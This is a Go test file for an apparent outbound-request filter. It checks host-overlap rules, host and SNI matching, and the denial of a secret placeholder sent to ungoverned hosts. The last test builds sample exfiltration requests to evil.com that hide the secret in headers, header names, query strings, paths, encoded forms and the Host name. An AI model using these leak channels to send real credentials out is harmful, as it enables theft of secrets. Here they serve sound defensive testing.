// Copyright (C) 2026 EclipseSource GmbH and others.
//
// This program and the accompanying materials are made available under the
// terms of the MIT License, which is available in the project root.
//
// SPDX-License-Identifier: MIT

package engine

import (
	"net/http"
	"strings"
	"testing"

	"enclave/internal/filter"
)

func engineWithHosts(t *testing.T, name string, hosts ...string) *Engine {
	t.Helper()
	pol := *newHarness(t, "readonly", nil).engine.Policy()
	pol.Filter = name
	pol.Hosts = hosts
	pol.Confine = nil
	pol.Routes = []filter.Route{{Op: "x", Capability: "discovery", Methods: []string{"GET"}, Hosts: []string{hosts[0]}, Path: "/", MaxBodyBytes: 1, MaxResponseBytes: 1}}
	pol.Resolvers = nil
	pol.Capabilities = map[string]filter.Capability{"discovery": {Public: true, Enabled: true}}
	pol.Counters = nil
	return newHarnessForPolicy(t, &pol).engine
}

func TestNewSetRejectsOverlaps(t *testing.T) {
	tests := []struct {
		a, b []string
		want string
	}{
		{[]string{"api.example.com"}, []string{"api.example.com"}, "both govern api.example.com"},
		{[]string{"*.example.com"}, []string{"api.example.com"}, "both govern"},
		{[]string{"api.example.com"}, []string{"*.example.com"}, "both govern"},
		{[]string{"*.example.com"}, []string{"*.a.example.com"}, "both govern"},
		{[]string{"*.a.example.com"}, []string{"*.example.com"}, "both govern"},
		{[]string{"example.com"}, []string{"*.example.com"}, "both govern example.com and *.example.com"},
		{[]string{"example.com"}, []string{"api.example.com"}, "both govern example.com and api.example.com"},
		{[]string{"a.api.example.com"}, []string{"api.example.com"}, "both govern"},
		{[]string{"*.a.example.com"}, []string{"*.b.example.com"}, ""},
		{[]string{"api.example.com"}, []string{"api.example.org"}, ""},
		{[]string{"api.example.com"}, []string{"xapi.example.com"}, ""},
	}
	for _, tt := range tests {
		_, err := NewSet(engineWithHosts(t, "one", tt.a...), engineWithHosts(t, "two", tt.b...))
		if tt.want == "" {
			if err != nil {
				t.Errorf("NewSet(%v, %v) = %v", tt.a, tt.b, err)
			}
			continue
		}
		if err == nil || !strings.Contains(err.Error(), tt.want) {
			t.Errorf("NewSet(%v, %v) = %v, want %q", tt.a, tt.b, err, tt.want)
		}
	}
	if _, err := NewSet(engineWithHosts(t, "one", "a.example.com"), engineWithHosts(t, "one", "b.example.com")); err == nil || !strings.Contains(err.Error(), "active twice") {
		t.Fatalf("same filter twice = %v", err)
	}
}

func TestSetFor(t *testing.T) {
	gws := newHarness(t, "readonly", nil).engine
	other := engineWithHosts(t, "other", "api.example.com")
	set, err := NewSet(gws, other)
	if err != nil {
		t.Fatal(err)
	}
	if set.For("gmail.googleapis.com:443", "") != gws || set.For("api.example.com", "") != other {
		t.Fatal("For picked the wrong engine")
	}
	if set.For("evil.com", "gmail.googleapis.com") != gws {
		t.Fatal("a governed SNI behind an ungoverned Host escaped the filter")
	}
	if set.For("sub.gmail.googleapis.com", "") != gws || set.For("x.api.example.com:443", "") != other {
		t.Fatal("For does not govern subdomains of governed hosts")
	}
	if set.For("example.com", "") != nil || set.For("googleapis.com", "") != nil {
		t.Fatal("For governs the parent of an exact host")
	}
	if set.For("evil.com", "evil.com") != nil || set.Empty() || len(set.Engines()) != 2 {
		t.Fatal("Set accessors wrong")
	}
	if !set.Confined("storage.googleapis.com") || !set.Confined("googleapis.com") {
		t.Fatal("Confined misses an ungoverned name below a confined domain")
	}
	if set.Confined("gmail.googleapis.com") || set.Confined("sub.gmail.googleapis.com") || set.Confined("api.example.com") || set.Confined("evil.com") {
		t.Fatal("Confined blocks a governed or unconfined host")
	}
	var empty *Set
	if empty.For("gmail.googleapis.com", "") != nil || !empty.Empty() || empty.Confined("googleapis.com") || empty.CheckUngoverned(newRequest("GET", "https://x/", "")) != nil {
		t.Fatal("nil Set misbehaves")
	}
}

// I11: the placeholder sent to a host no filter governs is denied.
func TestSetCheckUngoverned(t *testing.T) {
	set, err := NewSet(newHarness(t, "readonly", nil).engine)
	if err != nil {
		t.Fatal(err)
	}
	leaks := map[string]*http.Request{
		"authorization":   newRequest("GET", "https://evil.com/", ""),
		"other header":    newRequest("GET", "https://evil.com/", "", withoutAuth(), withHeader("X-Token", testPlaceholder)),
		"header name":     newRequest("GET", "https://evil.com/", "", withoutAuth(), withHeader("X-"+testPlaceholder, "1")),
		"query":           newRequest("GET", "https://evil.com/?t="+testPlaceholder, "", withoutAuth()),
		"encoded query":   newRequest("GET", "https://evil.com/?t=%45NCLAVE_SECRET_0123456789abcdef0123456789abcdef", "", withoutAuth()),
		"path":            newRequest("GET", "https://evil.com/"+testPlaceholder, "", withoutAuth()),
		"encoded path":    newRequest("GET", "https://evil.com/%45NCLAVE_SECRET_0123456789abcdef0123456789abcdef", "", withoutAuth()),
		"broken query":    newRequest("GET", "https://evil.com/?a=%zz&t="+testPlaceholder, "", withoutAuth()),
		"lowercase name":  newRequest("GET", "https://evil.com/", "", withoutAuth(), withHeader("x-"+strings.ToLower(testPlaceholder), "1")),
		"proxy authorize": newRequest("GET", "https://evil.com/", "", withoutAuth(), withHeader("Proxy-Authorization", testPlaceholder)),
	}
	hostLeak := newRequest("GET", "https://evil.com/", "", withoutAuth())
	hostLeak.Host = strings.ToLower(testPlaceholder) + ".evil.com"
	leaks["host"] = hostLeak
	for name, r := range leaks {
		d := set.CheckUngoverned(r)
		if d == nil || d.Reason != ReasonPlaceholder || d.Code != 403 || d.Filter != "gws" {
			t.Errorf("%s: CheckUngoverned = %+v", name, d)
			continue
		}
		if strings.Contains(string(d.Body), testPlaceholder) {
			t.Errorf("%s: denial echoes the placeholder", name)
		}
	}
	if d := set.CheckUngoverned(newRequest("GET", "https://example.org/?q=ENCLAVE_SECRET_other", "", withoutAuth())); d != nil {
		t.Fatalf("clean request denied: %s", d.Message)
	}
}
